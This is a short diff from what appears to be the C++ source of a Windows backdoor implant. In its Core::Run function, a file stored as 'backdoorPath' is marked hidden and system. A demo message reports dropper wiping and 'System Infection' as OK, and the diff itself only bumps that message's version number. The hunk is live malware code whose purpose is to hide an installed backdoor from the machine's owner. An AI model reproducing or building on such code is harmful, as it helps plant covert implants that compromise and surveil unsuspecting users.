@@ -48,7 +48,7 @@ BOOL Core::Run() {
 	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
 
-	ADDDEMOMESSAGE(L"Core Version: 2014022401\nDropper Wiping... OK\nSystem Infection : ... OK\n");
+	ADDDEMOMESSAGE(L"Core Version: 2014120801\nDropper Wiping... OK\nSystem Infection : ... OK\n");
 	DBG_TRACE_VERSION;
 
 	// Rimuoviamo il vecchio core se presente
